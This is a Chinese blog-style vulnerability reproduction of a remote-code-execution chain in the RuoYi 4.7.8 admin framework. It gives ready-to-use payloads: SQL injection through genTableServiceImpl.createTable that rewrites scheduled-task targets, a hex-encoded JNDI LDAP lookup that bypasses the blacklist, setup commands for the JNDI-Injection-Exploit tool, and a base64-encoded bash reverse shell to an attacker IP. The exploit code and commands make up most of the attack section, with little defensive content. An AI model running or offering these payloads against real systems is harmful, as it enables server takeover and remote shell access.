---
cve: "CVE-2022-4566"
source: "gelusus/wxvl 公众号漏洞文库"
---

#  最新Ruoyi漏洞复现   
原创 LULU  红队蓝军   2024-10-09 18:00  
  
**漏洞影响：若依4.7.8版本**  
  
**漏洞成因**  
  
在 ruoyi 4.7.5 版本之前，后台接口/tool/gen/createTable处存在 sql 注入(CVE-2022-4566)  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibZ6uZjjH3v6dYOBHEC2hMHouw41ZnmLmY0QtoLZD2IDxyCnsbjqHUiaE6Hia18H9X9Ut6ZJDelUmEibT4YxmqZLiaQ/640?wx_fmt=png&from=appmsg "")  
  
找到genTableService的实现类：GenTableServiceImpl，该类同样满足黑白名单条件  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibZ6uZjjH3v6dYOBHEC2hMHouw41ZnmLmUO5iciav9a2vrrfeoPemeHQPsnT1DPkjnSfYic5liceBW0mF37Rul1ep5g/640?wx_fmt=png&from=appmsg "")  
  
对应的 Mapper 语句:  
```
<update id="createTable">
       ${sql}
</update>

```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibZ6uZjjH3v6dYOBHEC2hMHouw41ZnmLmjBLhF1g3re3v39urfm6BAWhFdL2a7YjLFfXhXeNXV37Xuicfs10aQhw/640?wx_fmt=png&from=appmsg "")  
  
如果 GenTableServiceImpl 是 bean 对象，就可以直接调用 GenTableServiceImpl#createTable 执行 SQL 语句  
  
在启动类中打印所有加载的 bean，其中包括 genTableServiceImpl：  
```
ConfigurableApplicationContext run = SpringApplication.run(RuoYiApplication.class, args);
// 获取所有bean的名称
String[] beanDefinitionNames = run.getBeanDefinitionNames();
// 打印所有bean的名称
for (String beanDefinitionName : beanDefinitionNames) {
    System.out.println(beanDefinitionName);
}


```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibZ6uZjjH3v6dYOBHEC2hMHouw41ZnmLmzmuwqWMIlicH4DbZCEGAna8VUibJoP32NbONic9QP2va3rjeAzwkkcSIQ/640?wx_fmt=png&from=appmsg "")  
  
ruoyi黑白名单校验仅出现在com.ruoyi.quartz.controller.SysJobController#addSave，而任务状态修改接口中并没有添加，可不调用addSave方法添加计划任务内容，成功绕过黑白名单限制  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibZ6uZjjH3v6dYOBHEC2hMHouw41ZnmLmgUy9aAmgebfOG3J3S6QD4p5naVZXrbKm6zRoxDhmgUfYf4riaMDo3xw/640?wx_fmt=png&from=appmsg "")  
## 计划任务SQL注入   
  
修改id为1的计划任务的值为’zian’  
```
genTableServiceImpl.createTable('UPDATE sys_job SET invoke_target = 'zian' WHERE job_id = 1;')

```  
  
点击启用任务，ID为1的值成功被修改  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibZ6uZjjH3v6dYOBHEC2hMHouw41ZnmLmELRS5PGbgSBUquNePiaYFQ6BN6icePUydRql3zfxQWlqhv8YR9NBYUzQ/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibZ6uZjjH3v6dYOBHEC2hMHouw41ZnmLmCgicYff0JTk6IFHCqLRmpaLG55RVia6PGnL2KutDMpcLn4J14QOkCyJA/640?wx_fmt=png&from=appmsg "")  
## 利用计划任务执行任意命令   
  
**验证漏洞**  
  
**使用JNDI-Injection-Exploit起一个ldap服务**  
```
${jndi://ldap://xxxx.xxx.cn}

解析payload
1、首先 发现字符串有${},调用lookup函数
2、解析${}中的内容发现是JNDI的ldap服务
3、攻击者构造任意命令

```  
  
1、JNDI利用工具  
```
安装：git clone https://github.com/welk1n/JNDI-Injection-Exploit.git

切换目录：cd JNDI-Injection-Exploit

编译安装：mvn clean package -DskipTests 

切换到target目录 cd target


```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibZ6uZjjH3v6dYOBHEC2hMHouw41ZnmLmD0NG3mNfrUtBBic9dLQNZIQJ2eg5ryMEPU7fXQeCPqia4TWgrFiaG6rEQ/640?wx_fmt=png&from=appmsg "")  
  
使用 JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar，依赖Java 版本1.8 或者1.7  
```
工具使用方式：java-jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -c"命令" -A “攻击机的IP”

```  
```
jar JNDI-Injection-Exploit-Plus-2.3-SNAPSHOT-all.jar -C calc -A 攻击机IP

```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibZ6uZjjH3v6dYOBHEC2hMHouw41ZnmLmmfWShDiaibm8kNq9Dic97KTr3AKTXe4dgCjXYcGVzhMD6c2N7o9HeWeCQ/640?wx_fmt=png&from=appmsg "")  
  
由于JobInvokeUtil在调用过程中不允许在字符串中使用括号，因此将原始作业表中特定作业的参数值修改为十六进制（绕过防御检测）  
  
需要将ldap服务进行编码  
```
0x6A617661782E6E616D696E672E496E697469616C436F6E746578742E6C6F6F6B757028276C6461703A2F2F3139322E3136382E312E3130343A313338392F646573657269616C4A61636B736F6E2729

```  
  
修改id为3的计划任务为jndi payload  
```
genTableServiceImpl.createTable('UPDATE sys_job SET invoke_target = 0x6A617661782E6E616D696E672E496E697469616C436F6E746578742E6C6F6F6B757028276C6461703A2F2F3139322E3136382E312E3130343A313338392F646573657269616C4A61636B736F6E2729 WHERE job_id = 3;')

```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibZ6uZjjH3v6dYOBHEC2hMHouw41ZnmLmCU3IVF9iaCBXCyI0iaH7qQDBTEXgPVWzTyRN2AAr1q6vytnwugHENPicQ/640?wx_fmt=png&from=appmsg "")  
  
启用任务  
  
任务3的调用字符串已经是Jndi payload了，后面直接通过/monitor/job/changeStatus接口直接更改任务状态触发Jndi  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibZ6uZjjH3v6dYOBHEC2hMHouw41ZnmLmPGHcxC4zCXuIo2GhtvStA6jYcBnzvYicD8hCa5L6opBJdvWHhArVOKA/640?wx_fmt=png&from=appmsg "")  
### 漏洞利用  
  
**linux反弹shell**  
  
将反弹shell通过JNDI注入工具部署在LDAP服务 或者RMI 服务中  
```
bash -i >& /dev/tcp/192.168.xx.xx/7788 0>&1
base64编码后
bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjAuMTA4Lzc3ODggMD4mMQoKCg==}|{base64,-d}|{bash,-i}

```  
  
生成LDAP服务  
```
运行：java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjAuMTA4Lzc3ODggMD4mMQoKCg==}|{base64,-d}|{bash,-i}" -A "攻击机ip"

```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibZ6uZjjH3v6dYOBHEC2hMHouw41ZnmLmdHUlbwQHbhyeKicuonTJvletia5k7icemKgI8icEuxD5dLO89PhyiaIn1Hw/640?wx_fmt=png&from=appmsg "")  
  
将ldap服务十六进制编码后，通过计划任务id=2执行，这里使用kali 进行监听  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibZ6uZjjH3v6dYOBHEC2hMHouw41ZnmLm9e6Uc9j1nciaj1S6iavia5zKnk6J3NKvNgHAz2RBAQCjiblJKUCVibicWGMw/640?wx_fmt=png&from=appmsg "")  
  
参考文章：  
  
https://eddiemurphy89.github.io/2024/08/08/Ruoyi-v4-7-8-RCE%E5%88%86%E6%9E%90/  
  
加下方wx，拉你一起进群学习  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/ibZ6uZjjH3v5KP8CaWoS7GAJnWQQxPpibNdibOdl0hc3X6uuBy7rLVOoxS0OSd4vdHWcibFpZg9T9Bx6T7Rn87RoIw/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  


---

> 来源：gelusus/wxvl（微信公众号漏洞文章自动归档，原文见文首链接）
